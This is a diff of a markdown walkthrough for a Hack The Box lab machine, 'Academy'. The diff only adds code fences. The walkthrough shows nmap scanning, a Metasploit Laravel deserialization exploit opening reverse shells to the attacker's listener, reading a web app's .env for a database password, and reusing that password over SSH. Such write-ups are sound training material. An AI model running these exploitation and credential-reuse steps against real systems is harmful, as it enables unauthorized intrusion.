@@ -54,7 +54,7 @@ nmap -sC -sV -p22,80,33060 10.129.102.248
 ```
 
 **Detailed Results:**
-
+```bash
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -65,7 +65,7 @@ PORT STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Did not follow redirect to http://academy.htb/
 33060/tcp open mysqlx MySQL X protocol listener
-
+```
 
 **Key Findings:**
 - Hostname redirect to academy.htb
@@ -182,11 +182,11 @@ search laravel
 ```
 
 **Available Exploits:**
-
+```bash
 0 exploit/unix/http/laravel_token_unserialize_exec (2018-08-07)
 1 exploit/multi/php/ignition_laravel_debug_rce (2021-01-13)
 [Other exploits...]
-
+```
 
 **Selected:** `exploit/unix/http/laravel_token_unserialize_exec`
 
@@ -215,12 +215,12 @@ run
 ### Stage 4: Executing Exploit
 
 **Exploit Output:**
-
+```bash
 [] Started reverse TCP handler on 10.10.14.60:4444
 [] Command shell session 1 opened (10.10.14.60:4444 -> 10.129.102.248:60634)
 [] Command shell session 2 opened (10.10.14.60:4444 -> 10.129.102.248:60636)
 [] Command shell session 3 opened (10.10.14.60:4444 -> 10.129.102.248:60640)
-
+```
 
 **Multiple reverse shells established!**
 
@@ -256,14 +256,14 @@ ls -l /home
 ```
 
 **Users Found:**
-
+```bash
 drwxr-xr-x 2 21y4d 21y4d 4096 Aug 10 2020 21y4d
 drwxr-xr-x 2 ch4p ch4p 4096 Aug 10 2020 ch4p
 drwxr-xr-x 5 cry0l1t3 cry0l1t3 4096 Oct 7 19:01 cry0l1t3
 drwxr-xr-x 3 egre55 egre55 4096 Aug 10 2020 egre55
 drwxr-xr-x 2 g0blin g0blin 4096 Aug 10 2020 g0blin
 drwxr-xr-x 5 mrb3n mrb3n 4096 Aug 12 2020 mrb3n
-
+```
 
 **Target:** cry0l1t3 (has recent activity - Oct 7)
 
@@ -276,14 +276,14 @@ cat /var/www/html/academy/.env
 ```
 
 **Database Configuration:**
-
+```bash
 DB_CONNECTION=mysql
 DB_HOST=127.0.0.1
 DB_PORT=3306
 DB_DATABASE=academy
 DB_USERNAME=dev
 DB_PASSWORD=mySup3rP4s5w0rd!!
-
+```
 
 **Key Finding:** Database password: `mySup3rP4s5w0rd!!`
 
@@ -298,11 +298,11 @@ ssh cry0l1t3@localhost
 **Password:** mySup3rP4s5w0rd!!
 
 **Result:**
-
+```bash
 cry0l1t3@localhost's password: mySup3rP4s5w0rd!!
 $ id
 uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
-
+```
 
 **Success!** cry0l1t3 has access, and is member of **adm group**!
 
